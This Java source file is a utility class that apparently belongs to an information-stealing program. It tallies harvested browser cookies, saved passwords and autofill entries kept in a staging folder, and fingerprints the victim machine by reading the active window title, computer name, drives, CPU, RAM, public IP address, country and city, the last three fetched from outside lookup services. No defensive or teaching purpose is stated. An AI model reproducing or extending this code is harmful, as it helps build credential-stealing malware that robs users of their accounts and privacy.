package _256.utils;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.time.LocalTime;
import java.time.ZoneId;
import java.time.format.DateTimeFormatter;
import java.util.Date;
import java.util.Map;
import java.util.Objects;
import java.util.Scanner;

import com.sun.jna.Native;
import com.sun.jna.platform.win32.Advapi32Util;
import com.sun.jna.platform.win32.User32;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinReg;

public class Util {

	public static final int MAX_TITLE_LENGTH = 1024;
	public static String drive;
	public static int totalLineCountCookies = 0;
	public static int totalLineCountPasswords = 0;
	public static int totalLineCountAutoFills = 0;
	
	public static void lineCounterCookies() throws IOException {
		File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\" + "Cookies");
		if(!location.exists()) {
			return; 
		}
		for (File file : Objects.requireNonNull(location.listFiles())) {
			String str = file.getName();
			String cookies = System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\" + "Cookies" + "\\" + str;
			int lineCount = 0, commentsCount = 0;
			Scanner input = new Scanner(new File(cookies));
			while (input.hasNextLine()) {
				String data = input.nextLine();
				if (data.startsWith("//"))
					commentsCount++;
				lineCount++;
				totalLineCountCookies++;
			}
			input.close();
		}
	}
	
	public static void lineCounterPasswords() throws IOException {
		File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\" + "General" + "\\" + "Passwords.txt");
			int lineCount = 0, commentsCount = 0;
			if (!location.exists()) {
				return;
			}
			Scanner input = new Scanner(location);
			while (input.hasNextLine()) {
				String data = input.nextLine();
				if (data.startsWith("//"))
					commentsCount++;
				lineCount++;
				totalLineCountPasswords++;
			}
			input.close();
		totalLineCountPasswords = totalLineCountPasswords / 3;
	}
	
	public static void lineCounterAutoFills() throws IOException {
		File location = new File(System.getProperty("user.home") + "\\" + System.getProperty("user.name") + "\\" + "General" + "\\" + "AutoFills.txt");
			int lineCount = 0, commentsCount = 0;
			if (!location.exists()) {
				return;
			}
			Scanner input = new Scanner(location);
			while (input.hasNextLine()) {
				String data = input.nextLine();
				if (data.startsWith("//"))
					commentsCount++;
				lineCount++;
				totalLineCountAutoFills++;
			}
			input.close();
			totalLineCountAutoFills = totalLineCountAutoFills/ 2;
	}

	public static void printDrives() throws IOException {
		FileWriter writer = new FileWriter(System.getProperty("user.home") + "\\Documents\\drives.txt", true);
		BufferedWriter bufferWriter = new BufferedWriter(writer);
		File[] roots = File.listRoots();
		for (int i = 0; i < roots.length; i++) {
			drive = "" + roots[i];
			bufferWriter.write(drive + ", ");
		}
		bufferWriter.close();
	}

	public static String getActiveWindow() {
		char[] buffer = new char[MAX_TITLE_LENGTH * 2];
		WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
		User32.INSTANCE.GetWindowText(hwnd, buffer, MAX_TITLE_LENGTH);
		WinDef.RECT rect = new WinDef.RECT();
		User32.INSTANCE.GetWindowRect(hwnd, rect);
		return Native.toString(buffer);
	}

	public static String getComputerName() {
		Map<String, String> env = System.getenv();
		if (env.containsKey("COMPUTERNAME"))
			return env.get("COMPUTERNAME");
		else
			return env.getOrDefault("HOSTNAME", "Unknown Computer");
	}

	public static String getCountry() throws IOException {
		URL url = new URL("http://ip-api.com/line/?fields=1");
		Scanner sc = new Scanner(url.openStream());
		StringBuffer sb = new StringBuffer();
		while (sc.hasNext()) {
			sb.append(sc.next());
		}
		String result = sb.toString();
		result = result.replaceAll("<[^>]*>", "");
		return result;
	}
	
	public static String getCity() throws IOException {
		URL url = new URL("http://ip-api.com/line/?fields=2");
		Scanner sc = new Scanner(url.openStream());
		StringBuffer sb = new StringBuffer();
		while (sc.hasNext()) {
			sb.append(sc.next());
		}
		String result = sb.toString();
		result = result.replaceAll("<[^>]*>", "");
		return result;
	}

	public static String getCPU() {
		return Advapi32Util.registryGetStringValue(WinReg.HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0\\", "ProcessorNameString");
	}

	public static String getCPUKernels() {
		return String.valueOf(Runtime.getRuntime().availableProcessors());
	}

	public static String convertTurkeyTime() {
		return DateTimeFormatter.ofPattern("HH:mm").format(LocalTime.now(ZoneId.of("GMT+3")));
	}
	
	public static String getTime() {
		String time = new SimpleDateFormat("dd.MM.yyyy").format(new Date());
		if (time.startsWith("0")) {
			time = time.replaceFirst("0", "");
		}
		return time;
	}

	public static String getIP() {
		URL url;
		try {
			url = new URL("http://bot.whatismyipaddress.com");
			BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
			return reader.readLine().trim();
		} catch (Exception e) {
		}
		return null;
	}

	public static File getFolder() {
		File folder = new File(System.getProperty("user.home"), System.getProperty("user.name"));
		if (!folder.exists()) {
			folder.mkdirs();
		}
		return folder;
	}

	public static String getTotalRAM() {
		int memorySize = (int) (((com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean()).getTotalPhysicalMemorySize() / 1048576);
		int addOne = (memorySize) / 1024 + 1;
		return addOne + ".0 GB";
	}
}
